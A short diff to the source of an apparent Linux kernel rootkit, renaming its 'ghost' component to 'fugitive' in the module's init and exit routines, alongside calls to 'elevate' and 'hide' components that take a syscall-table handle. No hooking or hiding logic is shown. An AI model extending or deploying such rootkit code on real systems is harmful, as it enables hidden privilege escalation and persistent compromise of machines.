@@ -35,13 +35,13 @@ static void __exit rootkit_exit(void) {
   else
     ROOTKIT_DEBUG("elevate_exit() -> 0\n");
 #endif
-  retval = ghost_exit();
+  retval = fugitive_exit();
   
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("ghost_exit() -> %d\n", retval);
+    ROOTKIT_ERROR("fugitive_exit() -> %d\n", retval);
   else
-    ROOTKIT_DEBUG("ghost_exit() -> 0\n");
+    ROOTKIT_DEBUG("fugitive_exit() -> 0\n");
 #endif
   retval = hide_exit();
 
@@ -101,16 +101,16 @@ static int __init rootkit_init(void) {
 #ifdef DEBUG
   ROOTKIT_DEBUG("elevate_init(&rootkit__sctm) -> 0\n");
 #endif
-  retval = ghost_init(&rootkit__sctm);
+  retval = fugitive_init(&rootkit__sctm);
   
   if (retval) {
 #ifdef DEBUG
-    ROOTKIT_ERROR("ghost_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR("fugitive_init(&rootkit__sctm) -> %d\n", retval);
 #endif
     return retval;
   }
 #ifdef DEBUG
-  ROOTKIT_DEBUG("ghost_init(&rootkit__sctm) -> 0\n");
+  ROOTKIT_DEBUG("fugitive_init(&rootkit__sctm) -> 0\n");
 #endif
   retval = hide_init(&rootkit__sctm);
 
